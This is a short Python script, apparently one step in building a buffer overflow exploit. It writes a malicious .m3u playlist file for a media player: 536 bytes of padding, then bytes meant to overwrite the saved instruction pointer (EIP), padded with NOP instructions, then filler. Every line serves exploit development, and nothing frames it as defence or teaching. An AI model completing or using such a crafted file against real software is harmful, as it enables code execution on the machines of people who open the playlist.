#adjust truncated EIP with nops "\x90"
buffer = "A"*536 + "BB" +"\x90\x90" + "X" * 2864
f = open('file4.m3u','w')
f.write(buffer)
f.close()
